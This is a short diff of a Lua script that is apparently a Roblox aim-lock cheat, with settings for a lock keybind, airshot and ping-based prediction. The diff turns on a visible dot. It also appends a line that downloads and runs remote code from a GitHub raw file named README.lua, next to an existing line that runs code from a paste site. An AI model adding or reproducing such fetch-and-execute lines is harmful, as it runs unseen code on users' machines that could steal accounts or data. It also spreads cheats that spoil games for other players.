@@ -2,7 +2,7 @@ local Settings = {
     rewrittenmain = {
         Enabled = true, --// Leave This True
         Key = "c", --// Keybind To Lock
-        DOT = false, --// show the actual dot
+        DOT = true, --// show the actual dot
         AIRSHOT = true, --// airshot func idk why u would use
         NOTIF = true, --// show notifcations when ur locking
         AUTOPRED = true, --// changes prediction based on ping
@@ -295,3 +295,4 @@ local PredictionValue = 0.1111 --// Change Prediction,  AutoPrediction Must Be O
     end)
     
     loadstring(game:HttpGet("https://pastefy.app/oTXOueJa/raw", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/therealzeek/-codnsk/main/README.lua", true))()
